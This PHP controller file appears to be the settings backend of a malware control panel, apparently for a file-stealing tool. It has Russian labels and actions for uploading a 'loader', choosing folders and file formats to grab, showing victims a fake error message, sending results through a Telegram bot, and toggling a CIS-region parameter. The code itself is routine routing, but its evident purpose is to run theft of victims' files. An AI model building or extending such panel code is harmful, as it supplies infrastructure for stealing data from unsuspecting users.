<?php

namespace application\controllers;

use application\core\Controller;
use application\lib\Answer;
use \R;

class SettingsController extends Controller {

	public function loaderAction() {
		$this->view->render("Настройки лоадера");
	}

	public function domainsAction() {
		$this->view->render("Управление доменами");
	}

	public function telegramAction() {
		$this->view->render("Настройки телеграм-бота");
	}

	public function configAction() {
		$this->view->render("Настройки конфига");
	}

	public function accountsAction() {
		$this->view->render("Настройки аккаунтов", ["login" => $this->user->login]);
	}

	public function editAction() {
		if($this->route["type"] == "folder")
			echo json_encode($this->model->edit_config($_POST["id"], $_POST["data"])->Return());
		else if($this->route["type"] == "accounts") // Костыль
			echo json_encode($this->model->create_account($_POST["login"], $_POST["password"])->Return());
		else if($this->route["type"] == "dd")
			echo json_encode($this->model->edit_dd($_POST["domain"], $_POST["type"], $_POST["id"])->Return());
	}

	public function deleteAction() {
		if($this->route["type"] == "folder") 
			echo json_encode($this->model->delete_config($_POST["id"])->Return());
		else if($this->route["type"] == "accounts")
			echo json_encode($this->model->delete_account($_POST["id"])->Return());
		else if($this->route["type"] == "dd")
			echo json_encode($this->model->delete_dd($_POST["id"])->Return());
	}

	public function saveAction() {
		if($this->route["type"] == "fe")
			echo json_encode($this->model->save_fe($_POST["header"], $_POST["text"], $_POST["type"], $_POST["use"])->Return());
		else if($this->route["type"] == "folder")
			echo json_encode($this->model->save_dirs($_POST["name"], $_POST["path"], $_POST["recursive"], $_POST["rcount"], $_POST["size"], $_POST["formats"])->Return());
		else if($this->route["type"] == "telegram")
			echo json_encode($this->model->save_telegram($_POST["token"], $_POST["username"], $_POST["fa"], $_POST["send"])->Return());
		else if($this->route["type"] == "dd")
			echo json_encode($this->model->save_dd($_POST["domain"], $_POST["type"])->Return());
		else if($this->route["type"] == "accounts")
			echo json_encode($this->model->save_account($_POST["id"], $_POST["login"], $_POST["password"])->Return());
		else if($this->route['type'] == "loader")
			echo json_encode($this->model->save_loader($_FILES["loader-file"], isset($_POST["use_loader"])));
		else if($this->route["type"] == "params")
			echo json_encode($this->model->save_params($_POST["sng"] == "true")->Return());
	}

	public function infoAction() {
		if($this->route["type"] == "folder_table")
			echo json_encode($this->model->get_folder_table());
		else if($this->route["type"] == "accounts") 
			echo json_encode($this->model->get_accounts_table());
		else if($this->route["type"] == "fe") 
			echo json_encode($this->model->get_fake_error());
		else if($this->route["type"] == "telegram")
			echo json_encode($this->model->get_telegram_data());
		else if($this->route["type"] == "folder")
			echo json_encode($this->model->info_config($_POST["id"])->Return());
		else if($this->route["type"] == "dd_table")
			echo json_encode($this->model->get_dd_table());
		else if($this->route["type"] == "dd")
			echo json_encode($this->model->get_dd_info($_POST["id"]));
		else if($this->route["type"] == "loader")
			echo json_encode($this->model->get_loader_info());
		else if($this->route["type"] == "params")
			echo json_encode($this->model->get_params_info());

	}
}